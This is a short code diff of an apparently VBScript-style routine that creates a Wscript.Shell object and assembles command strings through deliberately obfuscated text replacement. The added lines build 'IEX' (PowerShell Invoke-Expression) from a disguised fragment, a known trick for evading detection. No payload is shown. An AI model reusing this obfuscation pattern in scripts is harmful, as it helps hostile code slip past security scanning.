@@ -471,8 +471,9 @@ Sub Main
    Dim ObjConsole As Object
    ObjConsole = CreateObject(`"Wscript.Shell`")
 
-   dIm $Apii,Cmd,Layback,Restricted
+   dIm $Apii,Cmd,Layback,Restricted,ttl,InvokeMe
    $Apii=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
+   ttl=`"I@`":InvokeMe=rEpLaCe(ttl, `"@`", `"EX`")
    Layback=rEpLaCe($Apii, `"@!`", `"`")
    Cmd=rEpLaCe(Layback, `":007:`", `"`")
 
